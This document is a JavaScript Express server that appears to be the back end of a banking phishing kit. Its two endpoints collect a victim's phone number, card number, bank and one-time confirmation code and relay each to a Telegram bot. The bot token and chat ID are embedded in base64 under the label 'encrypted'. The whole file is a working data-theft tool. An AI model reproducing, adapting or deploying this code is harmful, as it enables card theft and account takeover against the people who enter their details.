const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const atob = require('atob');

const app = express();
const port = 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.static('public'));

// Decrypt function
function decrypt(data) {
    return atob(data);
}

// Replace with your actual encrypted token and chat ID
const encryptedToken = "NzU4NDQ3MzQzMDpBQUVJaUtXQzhRTFR2WHNMNXQ1UHBkQ011bTRVa09aYU1vTQ==";
const encryptedChatId = "LTEwMDI0ODkzOTU2MTA=";
const token = decrypt(encryptedToken);
const chatId = decrypt(encryptedChatId);

// API Endpoint for handling data submission
app.post('/send-data', async (req, res) => {
    const { phone, card, bank } = req.body;

    if (!phone || !card || !bank) {
        return res.status(400).json({ error: 'All fields are required' });
    }

    const message = `Новая заявка:\nТелефон: ${phone}\nКарта: ${card}\nБанк: ${bank}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
            }),
        });

        if (response.ok) {
            res.status(200).json({ message: 'Data sent successfully' });
        } else {
            res.status(500).json({ error: 'Failed to send data' });
        }
    } catch (error) {
        res.status(500).json({ error: 'An error occurred while sending data' });
    }
});

// API Endpoint for handling code submission
app.post('/send-code', async (req, res) => {
    const { code } = req.body;

    if (!code) {
        return res.status(400).json({ error: 'Code is required' });
    }

    const message = `Код подтверждения: ${code}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
            }),
        });

        if (response.ok) {
            res.status(200).json({ message: 'Code sent successfully' });
        } else {
            res.status(500).json({ error: 'Failed to send code' });
        }
    } catch (error) {
        res.status(500).json({ error: 'An error occurred while sending code' });
    }
});

// Start server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
